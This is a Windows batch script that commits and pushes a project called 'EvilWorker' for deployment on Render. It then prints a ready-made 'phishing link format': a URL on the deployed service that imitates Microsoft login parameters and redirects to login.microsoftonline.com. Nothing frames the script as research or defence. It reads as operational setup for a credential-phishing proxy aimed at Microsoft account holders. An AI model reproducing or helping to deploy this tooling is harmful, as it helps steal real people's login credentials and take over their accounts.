@echo off
echo 🚀 Preparing EvilWorker for Render deployment...

REM Check if git is available
git --version >nul 2>&1
if %errorlevel% neq 0 (
    echo ❌ Git is not installed. Please install Git first.
    pause
    exit /b 1
)

REM Check if we're in a git repository
if not exist ".git" (
    echo ❌ Not in a git repository. Please run this script from the EvilWorker directory.
    pause
    exit /b 1
)

REM Add all files
echo 📁 Adding files to git...
git add .

REM Commit changes
echo 💾 Committing changes...
git commit -m "Prepare for Render deployment - Add Docker and deployment configs"

REM Push to remote
echo 🚀 Pushing to remote repository...
git push

echo.
echo ✅ Deployment preparation complete!
echo.
echo 📋 Next steps:
echo 1. Go to https://dashboard.render.com
echo 2. Click 'New +' and select 'Blueprint'
echo 3. Connect your repository
echo 4. Render will automatically deploy using render.yaml
echo.
echo 🌐 Your EvilWorker will be available at:
echo    https://your-service-name.onrender.com
echo.
echo 🔗 Phishing link format:
echo    https://your-service-name.onrender.com/login?method=signin^&mode=secure^&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4^&privacy=on^&sso_reload=true^&redirect_urI=https%%3A%%2F%%2Flogin.microsoftonline.com%%2F
echo.
echo 📖 For detailed instructions, see RENDER_DEPLOYMENT.md
pause
